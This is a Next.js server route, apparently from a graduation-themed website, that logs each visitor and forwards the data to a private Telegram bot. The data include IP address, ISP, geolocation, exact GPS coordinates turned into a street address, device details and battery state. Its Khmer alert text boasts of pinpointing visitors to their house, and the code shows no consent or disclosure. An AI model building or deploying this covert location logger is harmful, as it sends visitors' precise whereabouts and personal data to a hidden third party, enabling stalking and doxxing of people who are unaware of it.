import { NextResponse } from 'next/server';

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode.length !== 2) return '🌐';
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map((char) => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

function parseDeviceInfo(userAgent) {
  let deviceType = '💻 Desktop (កុំព្យូទ័រ)';
  let os = 'Unknown OS';
  let browser = 'Unknown Browser';

  // Device Type
  if (/tablet|ipad/i.test(userAgent)) {
    deviceType = '📱 Tablet (ថេប្លេត)';
  } else if (/mobile|iphone|android/i.test(userAgent)) {
    deviceType = '📱 Mobile (ទូរស័ព្ទដៃ)';
  }

  // Operating System
  if (/windows nt 10/i.test(userAgent)) os = 'Windows 10 / 11';
  else if (/windows nt 6.3/i.test(userAgent)) os = 'Windows 8.1';
  else if (/windows nt 6.1/i.test(userAgent)) os = 'Windows 7';
  else if (/iphone/i.test(userAgent)) {
    const match = userAgent.match(/OS (\d+[._]\d+)/i);
    os = match ? `Apple iOS ${match[1].replace('_', '.')}` : 'Apple iOS (iPhone)';
  } else if (/ipad/i.test(userAgent)) {
    os = 'Apple iPadOS';
  } else if (/mac os x/i.test(userAgent)) {
    os = 'macOS (Apple Mac)';
  } else if (/android/i.test(userAgent)) {
    const match = userAgent.match(/Android\s([0-9.]+)/i);
    os = match ? `Android ${match[1]}` : 'Android OS';
  } else if (/linux/i.test(userAgent)) {
    os = 'Linux';
  }

  // Browser detection
  if (/FBAN|FBAV/i.test(userAgent)) browser = 'Facebook App Browser 📘';
  else if (/Instagram/i.test(userAgent)) browser = 'Instagram App 📸';
  else if (/Telegram/i.test(userAgent)) browser = 'Telegram App ✈️';
  else if (/TikTok/i.test(userAgent)) browser = 'TikTok App 🎵';
  else if (/edg/i.test(userAgent)) browser = 'Microsoft Edge';
  else if (/chrome|crios/i.test(userAgent)) browser = 'Google Chrome';
  else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) browser = 'Apple Safari';
  else if (/firefox|fxios/i.test(userAgent)) browser = 'Mozilla Firefox';

  return { deviceType, os, browser };
}

export async function POST(req) {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.warn('Telegram Bot Token or Chat ID is missing in environment variables.');
      return NextResponse.json(
        { error: 'Telegram credentials missing or Chat ID not configured' },
        { status: 400 }
      );
    }

    const body = await req.json().catch(() => ({}));
    const clientPath = body.page || '/';
    const referrer = body.referrer || 'ចូលផ្ទាល់ (Direct Visit)';
    const screen = body.screen || 'មិនច្បាស់';
    const language = body.language || 'មិនច្បាស់';
    const clientTimezone = body.timezone || 'Asia/Phnom_Penh';
    const isDarkMode = body.isDarkMode;
    const networkType = body.networkType ? body.networkType.toUpperCase() : '';
    const battery = body.battery;
    const gps = body.gps;

    // Get client IP address
    const forwarded = req.headers.get('x-forwarded-for');
    let ip = forwarded ? forwarded.split(',')[0].trim() : req.headers.get('x-real-ip') || '';

    // In local development, fetch public IP for accurate testing
    const isLocal = !ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost';
    if (isLocal) {
      try {
        const ipifyRes = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
        if (ipifyRes.ok) {
          const ipifyData = await ipifyRes.json();
          ip = ipifyData.ip || '127.0.0.1 (Localhost)';
        } else {
          ip = '127.0.0.1 (Localhost)';
        }
      } catch {
        ip = '127.0.0.1 (Localhost)';
      }
    }

    const userAgent = req.headers.get('user-agent') || 'Unknown';
    const { deviceType, os, browser } = parseDeviceInfo(userAgent);

    // Fetch IP Location details
    let country = 'Unknown Country';
    let countryCode = '';
    let region = 'Unknown Region';
    let city = 'Unknown City';
    let zip = '';
    let isp = 'Unknown ISP';
    let org = '';
    let asNumber = '';
    let ipLat = null;
    let ipLon = null;

    if (ip && !ip.includes('127.0.0.1') && ip !== 'Unknown') {
      try {
        const geoRes = await fetch(
          `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as`,
          { next: { revalidate: 3600 } }
        );
        if (geoRes.ok) {
          const geoData = await geoRes.json();
          if (geoData.status === 'success') {
            country = geoData.country || country;
            countryCode = geoData.countryCode || '';
            region = geoData.regionName || region;
            city = geoData.city || city;
            zip = geoData.zip || '';
            isp = geoData.isp || isp;
            org = geoData.org || '';
            asNumber = geoData.as || '';
            if (geoData.lat && geoData.lon) {
              ipLat = geoData.lat;
              ipLon = geoData.lon;
            }
          }
        }
      } catch (e) {
        console.error('Geo lookup error:', e);
      }
    }

    // Check if we have exact GPS coordinates from user device
    const isExactGps = gps && typeof gps.lat === 'number' && typeof gps.lon === 'number';
    const finalLat = isExactGps ? gps.lat : ipLat;
    const finalLon = isExactGps ? gps.lon : ipLon;

    let exactAddress = '';
    if (isExactGps) {
      try {
        const nomRes = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${finalLat}&lon=${finalLon}&accept-language=km,en`,
          {
            headers: { 'User-Agent': 'RUA-Graduation-Tracker/1.0' },
            signal: AbortSignal.timeout(3000),
          }
        );
        if (nomRes.ok) {
          const nomData = await nomRes.json();
          if (nomData && nomData.display_name) {
            exactAddress = nomData.display_name;
          }
        }
      } catch (e) {
        console.error('Nominatim reverse geocode error:', e);
      }
    }

    const flag = getCountryFlag(countryCode);

    const currentTime = new Date().toLocaleString('en-US', {
      timeZone: 'Asia/Phnom_Penh',
      dateStyle: 'full',
      timeStyle: 'medium',
    });

    // Format Battery string
    let batteryText = 'មិនស្គាល់';
    if (battery && typeof battery.level === 'number') {
      batteryText = `🔋 ${battery.level}% ${battery.charging ? '(⚡ កំពុងសាកថ្ម / Charging)' : '(ប្រើថាមពលថ្ម)'}`;
    }

    // Format Theme
    const themeText = isDarkMode === true ? '🌙 Dark Mode (ងងឹត)' : isDarkMode === false ? '☀️ Light Mode (ភ្លឺ)' : 'Auto / System';

    // Format Location Section based on GPS vs IP
    let locationSection = '';
    if (isExactGps) {
      locationSection = `📍 <b>ទីតាំងភូមិសាស្ត្រ (🎯 ចាប់បាន GPS ផ្កាយរណបពិតប្រាកដ):</b>
  • <b>កម្រិតសុក្រឹតភាព:</b> 🎯 <b>ច្បាស់ដល់មុខផ្ទះ/ផ្លូវ (± ${gps.accuracy || 10} ម៉ែត្រ)</b>
  ${exactAddress ? `• <b>អាសយដ្ឋានលម្អិត:</b> ${exactAddress}\n  ` : ''}• <b>កូអរដោនេ GPS:</b> <code>${finalLat}, ${finalLon}</code>
  • 🗺️ <b>ផែនទី Google:</b> <a href="https://www.google.com/maps?q=${finalLat},${finalLon}"><b>ចុចទីនេះដើម្បីបើក Google Maps 📍 (ចំដំបូលផ្ទះ)</b></a>`;
    } else {
      locationSection = `📍 <b>ទីតាំងភូមិសាស្ត្រ (🌐 ប៉ាន់ស្មានតាម IP / ISP):</b>
  • <b>កម្រិតសុក្រឹតភាព:</b> 🌐 ប៉ាន់ស្មានតាម Server/បង្គោល ISP (~5-15km)
  • <b>ប្រទេស:</b> ${country} ${flag}
  • <b>រាជធានី/ខេត្ត:</b> ${region}
  • <b>ទីក្រុង:</b> ${city} ${zip ? `(Zip: ${zip})` : ''}
  ${finalLat && finalLon ? `• <b>កូអរដោនេ:</b> <code>${finalLat}, ${finalLon}</code>\n  ` : ''}${finalLat && finalLon ? `• 🗺️ <b>ផែនទី Google:</b> <a href="https://www.google.com/maps?q=${finalLat},${finalLon}"><b>ចុចទីនេះដើម្បីបើក Google Maps 📍</b></a>` : ''}`;
    }

    const message = `🚨 <b>ការជូនដំណឹង៖ មានអ្នកចូលទស្សនាថ្មី! (New Visitor)</b>
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>បណ្តាញអ៊ីនធឺណិត (Network & IP):</b>
  • <b>IP Address:</b> <code>${ip}</code>
  • <b>ក្រុមហ៊ុន (ISP):</b> ${isp}
  ${org ? `• <b>ស្ថាប័ន (Org):</b> ${org}\n  ` : ''}${asNumber ? `• <b>បណ្តាញ (AS):</b> ${asNumber}\n  ` : ''}${networkType ? `• <b>ល្បឿនបណ្តាញ:</b> 📶 ${networkType}\n  ` : ''}
${locationSection}

📱 <b>ឧបករណ៍ & ប្រព័ន្ធ (Device & System):</b>
  • <b>ប្រភេទឧបករណ៍:</b> ${deviceType}
  • <b>ប្រព័ន្ធប្រតិបត្តិការ:</b> ${os}
  • <b>កម្មវិធីរុករក:</b> ${browser}
  • <b>ទំហំអេក្រង់:</b> 🖥 ${screen}
  • <b>ភាសាឧបករណ៍:</b> 🌐 ${language}
  • <b>ថាមពលថ្ម:</b> ${batteryText}
  • <b>រូបរាង (Theme):</b> ${themeText}

📄 <b>ព័ត៌មានទស្សនា (Visit Details):</b>
  • <b>ទំព័របានចូល:</b> <code>${clientPath}</code>
  • <b>ប្រភពចូល (Referrer):</b> ${referrer}
  • <b>តំបន់ម៉ោង:</b> ⏰ ${clientTimezone}
  • <b>កាលបរិច្ឆេទ & ម៉ោង:</b> ${currentTime}
━━━━━━━━━━━━━━━━━━━━━`;

    const telegramRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: false,
      }),
    });

    const teleData = await telegramRes.json();

    if (!teleData.ok) {
      console.error('Telegram API error:', teleData);
      return NextResponse.json({ success: false, error: teleData.description }, { status: 500 });
    }

    // Send native interactive Telegram Location Map pin
    if (finalLat && finalLon) {
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            latitude: finalLat,
            longitude: finalLon,
          }),
        });
      } catch (mapErr) {
        console.error('Telegram sendLocation error:', mapErr);
      }
    }

    return NextResponse.json({ success: true, isGps: isExactGps });
  } catch (error) {
    console.error('Track visitor error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
